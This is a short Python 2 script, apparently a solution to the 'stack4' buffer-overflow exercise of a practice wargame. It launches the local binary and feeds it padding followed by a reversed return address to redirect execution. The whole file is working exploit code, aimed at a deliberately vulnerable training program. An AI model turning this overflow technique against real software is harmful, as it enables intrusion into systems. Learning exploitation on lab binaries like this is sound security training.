#!/usr/bin/python

from subprocess import Popen, PIPE
import binascii

p = Popen("/home/adam/stack4",stdin=PIPE)

buff = "".join([l * 3 for l in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"])

buff = buff[:len(buff) - 2]


flag = reversed('\x08\x04\x83\xf4')

payload = buff + "".join(flag)

print payload

p.communicate(payload)
